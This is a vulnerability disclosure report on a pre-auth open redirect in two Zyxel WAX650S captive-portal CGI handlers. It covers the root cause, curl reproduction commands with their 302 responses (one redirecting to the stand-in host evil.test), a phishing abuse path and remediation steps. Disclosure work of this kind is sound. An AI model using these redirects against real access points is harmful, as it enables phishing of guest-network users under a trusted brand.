# Open Redirect Finding Package
## Zyxel WAX650S V7.10(ABRM.4)C0

**One-sentence claim:** `dns_filter.cgi` and `ip_reputation_block.cgi` expose a pre-auth arbitrary redirect on the branded captive-portal host, allowing attacker-controlled navigation from a trusted Zyxel guest-network domain to an external site.

## Summary

This package covers one finding family, not two unrelated issues:

- `/cgi-bin/dns_filter.cgi`
- `/cgi-bin/ip_reputation_block.cgi`

Both handlers are unauthenticated on the tested lane and both issue `302 Found` redirects to attacker-controlled `ext_url` values while preserving the trusted captive-portal brand `nap-slogin.nebula.zyxel.com`. The practical impact is captive-portal phishing and trusted-domain abuse, not browser script execution.

The strongest honest framing is:

1. The bug is pre-auth.
2. It works on the branded captive-portal host.
3. The device's core workflow already conditions users to expect redirect-driven guest access.
4. The handlers appear intended to use a server-side policy URI, but request-side `ext_url` overrides that destination.

## Clarifying The Two Different "Host" Values

There are two separate host concepts in this finding:

- the query parameter `host=...`
- the HTTP request host header, for example `Host: nap-slogin.nebula.zyxel.com`

They matter in different ways.

### Query Parameter `host=...`

The CGI requires a syntactically valid `host` value and then appends it into the outbound `threat_url=` parameter. It is not the redirect destination. The redirect destination is still taken from attacker-controlled `ext_url`.

In practice, this means the attacker does not need control of the `host=` domain. They only need to supply any acceptable hostname value such as `connectivitycheck.gstatic.com` or `example.com`.

### HTTP Request Host Header

The bug itself is not dependent on the branded host header. The raw open redirect still exists without it.

However, the branded captive-portal host is what makes this bug materially stronger on this device. When the victim sees a URL under `nap-slogin.nebula.zyxel.com`, the redirect looks like a normal guest-network step rather than a generic off-domain jump.

## Affected Target And Version

- Product: `Zyxel WAX650S`
- Firmware: `V7.10(ABRM.4)C0`
- Firmware SHA-256: `e0a93db912c0b7203e0eb899f07ddef99b62a82a27352477c0f85d761576b1e0`
- Web server: `lighttpd 1.4.76`

## Vulnerable Code Or Technical Root Cause

### Auth Boundary

`auth_zyxel.conf` explicitly whitelists both handlers in the noauth skip pattern:

- `runroot/usr/local/lighttpd/conf/conf.d/auth_zyxel.conf`

Relevant lines:

```text
"/cdr.cgi",
"/ip_reputation_block.cgi",
"/dns_filter.cgi",
"/cloud_idp_login.cgi"
```

### Branded Captive-Portal Host

The shipped lighttpd config contains a host-specific captive-portal rewrite for the branded domain:

- `runroot/usr/local/lighttpd/conf/lighttpd.conf`

Relevant lines:

```text
$HTTP["host"] == "nap-slogin.nebula.zyxel.com" {
   url.rewrite-once = ( "^/CP/(.*)" => "/cgi-bin/tmp/captive-portal/$1")
}
```

### Static Sink Evidence

Both stripped CGIs expose the same attacker-controlled redirect vocabulary:

- `dns_filter.cgi`: `host`, `ext_url`, `is_valid_host`, `Location: %s?threat_url=%s&threat_type=%s%s`
- `ip_reputation_block.cgi`: `host`, `ext_url`, `is_valid_host`, `Location: %s?threat_url=%s&threat_type=%s`

### Intended Config Model

Both features define a server-side `block-page-type` choice with an external URI (`ext-page`) in their shipped YANG models:

- `runroot/usr/local/share/dns-filter/dns-filter.yin`
- `runroot/usr/local/share/ip-reputation/ip-reputation.yin`

That strengthens the argument that request-side `ext_url` should not be overriding the redirect destination directly.

## Reproducible Steps

### `dns_filter.cgi`

```bash
curl -sS -D - -o /dev/null --max-time 8 \
  -H 'Host: nap-slogin.nebula.zyxel.com:8080' \
  'http://127.0.0.1:8080/cgi-bin/dns_filter.cgi?host=connectivitycheck.gstatic.com&ext_url=https://guest-continue.example/portal/demo.html'
```

Expected result:

```text
HTTP/1.1 302 Found
Location: https://guest-continue.example/portal/demo.html?threat_url=connectivitycheck.gstatic.com&threat_type=Unknown
```

### `ip_reputation_block.cgi`

```bash
curl -sS -D - -o /dev/null --max-time 8 \
  -H 'Host: nap-slogin.nebula.zyxel.com:8080' \
  'http://127.0.0.1:8080/cgi-bin/ip_reputation_block.cgi?host=connectivitycheck.gstatic.com&ext_url=https://guest-continue.example/portal/demo.html'
```

Expected result:

```text
HTTP/1.1 302 Found
Location: https://guest-continue.example/portal/demo.html?threat_url=connectivitycheck.gstatic.com&threat_type=
```

## Proof Of Exploitation

### Live Dynamic Evidence

Current authoritative artifacts:

- `artifacts/live-summaries/ui_vuln_sweep_20260423ak_iprep_brand_sibling/summary.txt`
- `artifacts/live-summaries/ui_vuln_sweep_20260423ai_cp_brand_chain/summary.txt`
- `artifacts/reports/open-redirect/dynamic/iprep_direct_brand.hdr`
- `artifacts/reports/open-redirect/dynamic/dns_iprep_boundary_summary.txt`

Key confirmed live results:

- `ip_reputation_block.cgi` under `Host: nap-slogin.nebula.zyxel.com:8080` returned `HTTP/1.1 302 Found`
- the `Location:` header followed the attacker-controlled `ext_url`
- `dns_filter.cgi` showed the same sink shape on the branded host in the sibling sweep
- both handlers remained unauthenticated on the tested lane

Representative live header:

```text
HTTP/1.1 302 Found
Location: http://evil.test/path?threat_url=example.com&threat_type=
```

## Realistic Abuse Path

The realistic attacker use case is straightforward:

1. The attacker prepares a URL on the trusted captive-portal host that points `ext_url` at an external controlled page.
2. The victim is induced to open that URL as part of a guest-access or connectivity-fix pretext, for example through a guest onboarding message, QR code, or typed URL.
3. The device responds with `302 Found` from the trusted Zyxel captive-portal hostname.
4. The victim lands on the external page, which can be styled to look like a normal continuation or sign-in step.

The included PoC uses that model, but keeps the landing page benign and non-collecting.

### Negative Results That Tighten The Claim

- Do not claim XSS from this package.
- Chromium blocked the tested `javascript:` and `data:` follow-on attempts at the browser layer.
- Raw CRLF in `ext_url` returned `HTTP 400`, so this package should stay at open redirect, not response splitting.

## Impact

### Confirmed Impact

- pre-auth attacker-controlled redirect
- works on the branded captive-portal host
- suitable for trusted-domain abuse and phishing pretexting

### Why This Is Stronger On This Device

This is a captive-portal-centric access point. Users joining guest Wi-Fi already expect branded redirects before network access is granted. That makes a redirect from `nap-slogin.nebula.zyxel.com` materially more believable than a generic webapp redirect.

The most realistic demonstration is not credential theft code. It is a benign continuation page hosted on a controlled domain that looks like a normal guest-network step. The included PoC follows that model.

### Severity Position

- Recommended CWE: `CWE-601`
- Recommended treatment: one CVE family affecting both handlers
- Honest severity: `Medium`

The CVE argument should stay tied to the product context: this is a pre-auth redirect on a captive-portal access point, not an ordinary post-auth webapp redirect.

## Remediation

1. Remove request-side control over `ext_url` entirely for both handlers.
2. Resolve external block-page destinations only from server-side policy (`ext-page`), not from client input.
3. If a request parameter must be kept, allowlist exact origins or exact paths instead of full arbitrary URIs.
4. Consider removing these handlers from the unauthenticated skip list unless they are strictly required before login.
5. Normalize and reject scheme-relative destinations such as `//host/path`.

## Supporting Files

- `artifacts/open-redirect-poc/reproduce.sh`
- `artifacts/open-redirect-poc/POC_URLS.md`
- `artifacts/open-redirect-poc/guest-continue-demo.html`
- `artifacts/reports/open-redirect/ARTIFACTS.md`
